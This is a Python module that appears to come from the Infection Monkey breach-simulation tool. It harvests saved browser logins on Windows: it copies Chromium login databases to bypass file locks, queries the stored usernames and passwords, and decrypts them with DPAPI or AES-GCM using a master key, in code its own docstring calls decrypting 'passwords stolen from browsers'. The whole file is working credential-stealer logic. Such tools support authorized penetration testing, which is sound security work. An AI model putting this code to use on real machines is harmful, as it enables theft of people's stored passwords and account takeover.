import logging
import shutil
import sqlite3
import tempfile
from pathlib import Path
from typing import Collection, List, Optional, Tuple

from Cryptodome.Cipher import AES

from common.credentials import Credentials, EmailAddress, Password, Username
from common.types import Event
from infection_monkey.utils.threading import interruptible_iter

from .browser_credentials_database_path import BrowserCredentialsDatabasePath
from .windows_decryption import win32crypt_unprotect_data

logger = logging.getLogger(__name__)


class WindowsCredentialsDatabaseProcessor:
    def __call__(
        self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
    ) -> Collection[Credentials]:
        credentials = []

        for item in interruptible_iter(database_paths, interrupt):
            with tempfile.NamedTemporaryFile() as temporary_database_file:
                temporary_database_path = Path(tempfile.gettempdir()) / temporary_database_file.name

                # copy database before querying it to bypass lock errors
                with open(item.database_file_path, "rb") as database_file:
                    shutil.copyfileobj(database_file, temporary_database_file)

                try:
                    credentials.extend(
                        self._extract_credentials(
                            temporary_database_path=temporary_database_path,
                            master_key=item.master_key,
                        )
                    )
                except Exception as err:
                    logger.debug(f"{err}")

        return [
            Credentials(
                identity=self._get_identity(user),
                secret=Password(password=password),
            )
            for user, password in set(credentials)
        ]

    @staticmethod
    def _get_identity(user: str) -> str:
        try:
            return EmailAddress(email_address=user)
        except ValueError:
            return Username(username=user)

    def _extract_credentials(
        self, temporary_database_path: Path, master_key: Optional[bytes] = None
    ) -> List[Tuple[str, str]]:
        """
        Extracts credentials from the given database
        """

        database_query = "SELECT username_value, password_value FROM logins"

        credentials: List[Tuple[str, str]] = []

        try:
            conn = sqlite3.connect(temporary_database_path)
        except Exception as err:
            logger.error(f"Encountered an exception while connecting to database: {err}")
            return credentials

        try:
            cursor = conn.cursor()
            cursor.execute(database_query)
        except Exception as err:
            logger.error(f"Encountered an exception while executing query on database: {err}")
            return credentials

        for username, password in cursor.fetchall():
            try:
                password = self._decrypt_password(password, master_key)
                if username or password:
                    credentials.append((username, password))
            except Exception as err:
                logger.error(
                    f"Encountered an exception while trying to decrypt the password: {err}"
                )
                # even if the password couldn't be decrypted, we don't want to lose the username
                credentials.append((username, ""))

        conn.close()

        return credentials

    def _decrypt_password(self, encrypted_password: bytes, master_key: Optional[bytes]) -> str:
        if encrypted_password.startswith(b"v10"):  # chromium > v80
            decrypted_password = self._decrypt_password_v80(encrypted_password, master_key)
        else:
            try:
                password_bytes = win32crypt_unprotect_data(encrypted_password)
                if password_bytes not in [None, False]:
                    decrypted_password = password_bytes.decode("utf-8")
            except Exception:
                decrypted_password = ""

        return decrypted_password

    def _decrypt_password_v80(self, encrypted_password: bytes, master_key: Optional[bytes]) -> str:
        """
        Decrypts passwords stolen from browsers with Chromium > v80
        """

        if not master_key:
            return ""

        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)

        decrypted_password = cipher.decrypt(payload)
        decrypted_password = decrypted_password[:-16].decode()  # remove suffix bytes

        return decrypted_password
